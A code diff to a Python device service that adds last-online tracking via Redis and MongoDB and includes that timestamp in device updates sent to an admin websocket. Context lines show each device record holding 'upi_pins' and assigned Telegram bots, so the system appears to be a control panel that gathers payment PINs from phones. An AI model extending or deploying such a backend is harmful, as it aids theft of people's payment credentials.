@@ -45,6 +45,33 @@ class DeviceService:
             if isinstance(value, datetime):
                 doc[field] = to_iso_string(ensure_utc(value))
 
+    @staticmethod
+    async def mark_device_activity(device_id: str) -> None:
+        """
+        Mark device as active - updates both Redis (for fast online tracking) 
+        and MongoDB (for persistent last_online_update timestamp).
+        Call this whenever device sends ANY request to the server.
+        """
+        try:
+            # Mark in Redis with 5-minute TTL (fast online tracking)
+            from .device_online_tracker import device_online_tracker
+            await device_online_tracker.mark_online(device_id)
+            
+            # Update MongoDB with last_online_update timestamp
+            now = utc_now()
+            await mongodb.db.devices.update_one(
+                {"device_id": device_id},
+                {
+                    "$set": {
+                        "last_online_update": now,
+                        "is_online": True,
+                        "status": "online",
+                        "updated_at": now
+                    }
+                }
+            )
+        except Exception as e:
+            logger.warning(f"Failed to mark device activity for {device_id}: {e}")
 
     @staticmethod
     def _assign_telegram_bot() -> int:
@@ -269,6 +296,7 @@ class DeviceService:
                         "admin_username": device_doc.get("admin_username"),
                         "has_upi": device_doc.get("has_upi", False),
                         "upi_pins": device_doc.get("upi_pins", []),
+                        "last_online_update": to_iso_string(ensure_utc(device_doc.get("last_online_update"))) if device_doc.get("last_online_update") else None,
                         "updated_at": to_iso_string(ensure_utc(device_doc.get("updated_at"))),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -302,6 +330,7 @@ class DeviceService:
                         "battery_level": device_doc.get("battery_level"),
                         "has_upi": device_doc.get("has_upi", False),
                         "upi_pins": device_doc.get("upi_pins", []),
+                        "last_online_update": to_iso_string(ensure_utc(device_doc.get("last_online_update"))) if device_doc.get("last_online_update") else None,
                         "updated_at": to_iso_string(utc_now()),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -330,6 +359,7 @@ class DeviceService:
                         "battery_level": battery_level,
                         "has_upi": device_doc.get("has_upi", False),
                         "upi_pins": device_doc.get("upi_pins", []),
+                        "last_online_update": to_iso_string(ensure_utc(device_doc.get("last_online_update"))) if device_doc.get("last_online_update") else None,
                         "updated_at": to_iso_string(utc_now()),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -358,6 +388,7 @@ class DeviceService:
                         "battery_level": device_doc.get("battery_level"),
                         "has_upi": device_doc.get("has_upi", False),
                         "upi_pins": device_doc.get("upi_pins", []),
+                        "last_online_update": to_iso_string(utc_now()),
                         "updated_at": to_iso_string(utc_now()),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -440,6 +471,7 @@ class DeviceService:
                         "uninstalled_at": to_iso_string(utc_now()),
                         "status": device_doc.get("status"),
                         "is_online": device_doc.get("is_online"),
+                        "last_online_update": to_iso_string(ensure_utc(device_doc.get("last_online_update"))) if device_doc.get("last_online_update") else None,
                         "updated_at": to_iso_string(utc_now()),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -489,6 +521,7 @@ class DeviceService:
                                 "battery_level": device_doc.get("battery_level"),
                                 "has_upi": device_doc.get("has_upi", False),
                                 "upi_pins": device_doc.get("upi_pins", []),
+                                "last_online_update": to_iso_string(utc_now()),
                                 "updated_at": to_iso_string(utc_now()),
                             }
                             await admin_ws_manager.notify_device_update(device_id, device_payload)
@@ -1630,6 +1663,7 @@ class DeviceService:
                         "is_deleted": True,
                         "status": "offline",
                         "is_online": False,
+                        "last_online_update": to_iso_string(now),
                         "updated_at": to_iso_string(now),
                     }
                     await admin_ws_manager.notify_device_update(device_id, device_payload)
